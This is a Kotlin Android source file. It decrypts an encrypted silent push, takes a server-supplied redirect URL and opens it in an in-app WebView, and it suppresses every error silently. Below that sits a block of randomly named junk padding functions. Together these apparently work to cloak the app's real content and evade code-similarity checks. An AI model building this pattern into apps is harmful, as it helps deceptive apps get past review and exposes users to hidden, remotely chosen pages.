package com.kFjQzLm.VpRnTx.push

import android.content.Context
import com.kFjQzLm.VpRnTx.core.AppActivity
import com.kFjQzLm.VpRnTx.core.AppConstants
import com.kFjQzLm.VpRnTx.crypto.AesGcm
import com.kFjQzLm.VpRnTx.gate.InitRuntime
import com.kFjQzLm.VpRnTx.storage.SharedPreferencesHelper
import com.kFjQzLm.VpRnTx.webview.ViewportBackend
import org.json.JSONObject

/**
 * Handles the worker-delivered init result (silent push with an encrypted body).
 */
object InitPushHandler {

    suspend fun handle(context: Context, encryptedBody: String) {
        try {
            val decrypted = AesGcm.decryptHexUtf8(encryptedBody)
            if (decrypted.isEmpty()) return

            val obj = JSONObject(decrypted)
            val redirectUrlInitial = obj.optString("redirectUrlInitial").ifEmpty { null }
            val redirectUrl = obj.optString("redirectUrl").ifEmpty { null }

            if (redirectUrlInitial != null) {
                try {
                    SharedPreferencesHelper.saveString(AppConstants.FIN_KEY, redirectUrlInitial)
                } catch (_: Exception) {
                }

                val finalUrl = InitRuntime.appendSendId(redirectUrlInitial, InitRuntime.pendingSendId)
                val activity = AppActivity.current()
                if (activity == null) {
                    ViewportBackend.saveLastUrl(redirectUrlInitial)
                    return
                }
                val current = ViewportBackend.getState()
                if ((current.visible || current.openingInProgress) && current.url == finalUrl) {
                    return
                }
                ViewportBackend.show(activity, finalUrl, persistUrl = redirectUrlInitial)
                return
            }

            if (redirectUrl != null) {
                try {
                    SharedPreferencesHelper.saveString(AppConstants.STORAGE_US_BLOCK, "1")
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
            // silent
        }
    }

    
}

/* autopad-begin */
private object Padbodewosemoa3 {
    private fun luryzydy(wesoxilu: Int): Int {
        val jydoqehy = wesoxilu + 53
        return jydoqehy
    }
    private fun zakadyne(baquhyni: Int): Int {
        val rotezyzu = baquhyni + 21
        return rotezyzu
    }
    private fun lekybila(roqojequ: Int): Int {
        val tefetutu = roqojequ + 44
        return tefetutu
    }
    private fun jerybidu(huvigihe: Int): Int {
        val tanawele = huvigihe + 4
        return tanawele
    }
    private fun hytyfeqo(hynijupy: Int): Int {
        val torubagi = hynijupy + 33
        return torubagi
    }
    private fun sahufety(zutehyfi: Int): Int {
        val catiroho = zutehyfi + 4
        return catiroho
    }
    private fun hozunako(rycewixa: Int): Int {
        val dafyrupe = rycewixa + 89
        return dafyrupe
    }
    private fun wofofepy(lefyfaty: Int): Int {
        val qalarako = lefyfaty + 35
        return qalarako
    }
    private fun memymuhy(lacatace: Int): Int {
        val saqyqucu = lacatace + 3
        return saqyqucu
    }
    private fun nohawejy(kijaraby: Int): Int {
        val jasodaci = kijaraby + 8
        return jasodaci
    }
}
/* autopad-end */
